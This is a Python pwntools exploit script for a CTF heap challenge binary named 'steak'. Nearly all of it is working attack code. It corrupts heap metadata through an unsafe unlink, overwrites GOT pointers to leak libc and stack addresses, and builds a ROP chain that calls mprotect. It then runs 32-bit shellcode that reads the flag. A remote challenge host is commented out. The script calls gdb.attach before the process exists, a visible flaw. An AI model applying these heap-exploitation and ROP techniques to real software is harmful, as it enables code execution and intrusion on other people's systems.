from pwn import *
elf = ELF("./steak")
libc = ELF("libc-2.23.so")
#context.terminal = ['mate-terminal', '--maximize', '-x', 'sh', '-c']
context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['tmux', 'splitw', '-v']
context.log_level = 'debug'

gdb.attach(p,"""
	b *0x401094
	b *0x400CCB
	b *0x400EDC
	c
	""")




rdi = 0x0000000000021102
rsi = 0x202e8
rdx = 0x01b92
rsp = 0x0000000000003838
shellcode = asm(shellcraft.i386.linux.cat('flag'))
def add(size,content):
	p.sendlineafter(">","1")
	p.sendlineafter(":\n",str(size))
	p.sendafter(":\n",content)
def delete(id):
	p.sendlineafter(">","2")
	p.sendlineafter(":\n",str(id))
def edit(id,size,content):
	p.sendlineafter(">","3")
	p.sendlineafter(":\n",str(id))
	p.sendlineafter(":\n",str(size))
	p.sendafter(":\n",content)
def copy(id1,id2,size):
	p.sendlineafter(">","4")
	p.sendlineafter(":\n",str(id1))
	p.sendlineafter(":\n",str(id2))
	p.sendlineafter(":\n",str(size))
for i in range(0x30):
	print i
	p = process("./steak")
	
	try:
		
		# p = remote("106.75.115.249",39453)
		add(0x100,"test")
		add(0x100,"test")
		add(0x100,"test")
		add(0x100,"test")
		add(0x20,"cat flag\x00")
		payload = p64(0) + p64(0x101) + p64(0x6021b0 - 0x18) + p64(0x6021b0 - 0x10)
		payload = payload.ljust(0x100,"\x00")
		payload += p64(0x100) + p64(0x110)
		edit(2,len(payload),payload)
		delete(3)
		edit(2,0x20,p64(0) + p64(elf.got['puts']) + p64(0x6021a8)*2)
		copy(0,1,8)
		add(0x10,"\x78")
		copy(5,2,8)
		edit(2,2,"\xa8\x37")
		copy(0,1,8)
		delete(5)
		main_arena = u64(p.recvuntil("\n")[:-1].ljust(8,"\x00"))
		libc.address = main_arena - 0x3c4d78
		log.success("libc address = " + hex(libc.address))
		edit(2,8,p64(libc.symbols['environ']))
		delete(1)
		stack = u64(p.recvuntil("\n")[:-1].ljust(8,"\x00"))
		log.success("stack = " + hex(stack))
		target = stack - 0xf0
		payload = p64(libc.address + rdi)
		payload += p64(0x00602000)
		payload += p64(libc.address + rsi)
		payload += p64(0x1000)
		payload += p64(libc.address + rdx)
		payload += p64(7)
		payload += p64(libc.symbols['mprotect'])
		payload += p64(libc.address + rsp)
		payload += p64(0x602500)

		# payload += p64(0x33)
		payload += p64(0x23)
		add(len(payload),payload)
		edit(2,8,p64(target))
		copy(6,1,len(payload))
		edit(2,8,p64(0x602500))
		payload = p64(0x602510) + p32(0x602511) + p32(0x23) + "\xcb" + shellcode
		add(len(payload),payload)
		copy(7,1,len(payload))
		p.sendlineafter(">\n","5")
		data = p.recvuntil("}")
		if data:
			print data
			p.close()
			break
		else:
			print "sth wrong"
			print data
			p.close()
	except:
		p.close()